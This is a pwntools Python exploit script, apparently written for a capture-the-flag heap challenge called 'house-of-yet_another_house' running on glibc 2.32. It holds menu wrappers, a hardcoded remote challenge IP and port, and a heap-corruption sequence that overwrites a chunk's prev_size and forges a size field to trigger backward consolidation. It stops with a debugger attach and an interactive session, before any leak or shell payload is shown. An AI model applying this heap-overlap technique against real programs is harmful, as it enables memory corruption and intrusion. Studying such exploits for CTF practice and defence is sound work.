#!/usr/bin/env python

from pwn import *
import sys
from time import sleep

remote_ip,port = '69.90.132.248','11000'
binary = ['./house-of-yet_another_house']

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)

if(len(sys.argv) > 1):
    io=remote(remote_ip,port)
    context.noptrace = True

else:
    io=process(binary,env = {"LD_PRELOAD" : "./libc-2.32.so"})

def choice(i):
    sla("| ",str(i))

def add(size,data):
    choice(1)
    sla("Size: ",str(size))
    sa("Data: ",data)

def free(idx):
    choice(2)
    sla("Index: ",str(idx))

def view(idx):
    choice(3)
    sla("Index: ",str(idx))

def edit(idx,data):
    choice(4)
    sla("Index: ",str(idx))
    s(data)

if __name__=="__main__":
    add(0x500,"aaaa")  # 0
    add(0x108,"aaaa")   # 1
    add(0x4f0,"aaaa")  # 2
    add(0x101,"aaaa")  # 3
    free(0)
    add(0x600,"aaaa")  # 0
    payload = "\x00"*0x100 + p64(0x610)
    edit(1,payload)
    payload = "\x00"*7 + "\x11\x06\x00\x00\x00\x00"
    gdb.attach(io)
    add(0x500,payload)
    free(2)
    io.interactive()
